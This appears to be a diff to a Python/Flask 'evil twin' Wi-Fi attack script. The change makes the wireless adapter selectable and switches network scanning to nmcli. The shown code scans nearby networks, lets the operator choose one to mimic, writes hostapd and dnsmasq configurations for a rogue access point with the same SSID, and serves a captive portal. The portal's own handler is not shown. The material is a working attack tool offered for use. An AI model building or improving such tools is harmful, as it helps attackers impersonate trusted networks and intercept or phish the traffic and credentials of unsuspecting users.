@@ -5,19 +5,35 @@ from flask import Flask, request, redirect, render_template_string
 
 app = Flask(__name__)
 
-# Function to scan for available Wi-Fi networks
-def scan_wifi():
+# Function to list available Wi-Fi adapters
+def list_wifi_adapters():
     try:
-        print("[*] Scanning for available Wi-Fi networks...")
-        result = subprocess.run(["iwlist", "wlan0", "scan"], capture_output=True, text=True)
-        if result.returncode != 0:
-            raise Exception("Failed to scan Wi-Fi networks. Ensure your Wi-Fi adapter is connected and 'iwlist' is installed.")
-        
-        networks = []
+        print("[*] Listing available Wi-Fi adapters...")
+        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
+        adapters = []
         for line in result.stdout.splitlines():
-            if "ESSID" in line:
-                ssid = line.split('"')[1]
-                networks.append(ssid)
+            if "IEEE 802.11" in line:
+                adapter = line.split()[0]
+                adapters.append(adapter)
+        
+        if not adapters:
+            raise Exception("No Wi-Fi adapters found. Ensure your Wi-Fi adapter is connected and recognized.")
+        
+        return adapters
+    except Exception as e:
+        print(f"[!] Error listing Wi-Fi adapters: {e}")
+        return []
+
+# Function to scan for available Wi-Fi networks
+def scan_wifi(adapter):
+    try:
+        print(f"[*] Scanning for available Wi-Fi networks using {adapter}...")
+        result = subprocess.run(["nmcli", "-f", "SSID", "dev", "wifi"], capture_output=True, text=True)
+        if result.returncode != 0:
+            raise Exception("Failed to scan Wi-Fi networks. Ensure 'nmcli' is installed and your Wi-Fi adapter is functioning.")
+        
+        networks = result.stdout.splitlines()[1:]  # Skip the header line
+        networks = [net.strip() for net in networks if net.strip()]  # Remove empty lines
         
         if not networks:
             raise Exception("No Wi-Fi networks found. Ensure your Wi-Fi adapter is functioning properly.")
@@ -28,11 +44,11 @@ def scan_wifi():
         return []
 
 # Function to set up a rogue access point
-def setup_rogue_ap(ssid):
+def setup_rogue_ap(adapter, ssid):
     try:
-        print(f"[*] Setting up rogue access point for SSID: {ssid}")
+        print(f"[*] Setting up rogue access point for SSID: {ssid} on {adapter}...")
         with open("/etc/hostapd/hostapd.conf", "w") as f:
-            f.write(f"interface=wlan0\n")
+            f.write(f"interface={adapter}\n")
             f.write(f"driver=nl80211\n")
             f.write(f"ssid={ssid}\n")
             f.write(f"hw_mode=g\n")
@@ -55,11 +71,11 @@ def setup_rogue_ap(ssid):
         exit(1)
 
 # Function to set up DNS and DHCP
-def setup_dns_dhcp():
+def setup_dns_dhcp(adapter):
     try:
         print("[*] Setting up DNS and DHCP...")
         with open("/etc/dnsmasq.conf", "w") as f:
-            f.write("interface=wlan0\n")
+            f.write(f"interface={adapter}\n")
             f.write("dhcp-range=192.168.1.10,192.168.1.100,12h\n")
             f.write("dhcp-option=3,192.168.1.1\n")
             f.write("dhcp-option=6,192.168.1.1\n")
@@ -92,8 +108,26 @@ def captive_portal():
 
 def main():
     try:
-        # Step 1: Scan for available Wi-Fi networks
-        networks = scan_wifi()
+        # Step 1: List available Wi-Fi adapters
+        adapters = list_wifi_adapters()
+        if not adapters:
+            print("[!] No Wi-Fi adapters found. Exiting.")
+            exit(1)
+
+        print("[*] Available Wi-Fi adapters:")
+        for i, adapter in enumerate(adapters):
+            print(f"{i + 1}. {adapter}")
+
+        # Step 2: Select a Wi-Fi adapter
+        selected_adapter = input("[*] Enter the number of the Wi-Fi adapter to use: ")
+        try:
+            selected_adapter = adapters[int(selected_adapter) - 1]
+        except (IndexError, ValueError):
+            print("[!] Invalid selection. Exiting.")
+            exit(1)
+
+        # Step 3: Scan for available Wi-Fi networks
+        networks = scan_wifi(selected_adapter)
         if not networks:
             print("[!] No networks found. Exiting.")
             exit(1)
@@ -102,7 +136,7 @@ def main():
         for i, ssid in enumerate(networks):
             print(f"{i + 1}. {ssid}")
 
-        # Step 2: Select a network to mimic
+        # Step 4: Select a network to mimic
         selected = input("[*] Enter the number of the network you want to mimic: ")
         try:
             selected_ssid = networks[int(selected) - 1]
@@ -110,13 +144,13 @@ def main():
             print("[!] Invalid selection. Exiting.")
             exit(1)
 
-        # Step 3: Set up rogue access point
-        setup_rogue_ap(selected_ssid)
+        # Step 5: Set up rogue access point
+        setup_rogue_ap(selected_adapter, selected_ssid)
 
-        # Step 4: Set up DNS and DHCP
-        setup_dns_dhcp()
+        # Step 6: Set up DNS and DHCP
+        setup_dns_dhcp(selected_adapter)
 
-        # Step 5: Start the captive portal
+        # Step 7: Start the captive portal
         print("[*] Starting captive portal...")
         app.run(host="192.168.1.1", port=80)
 
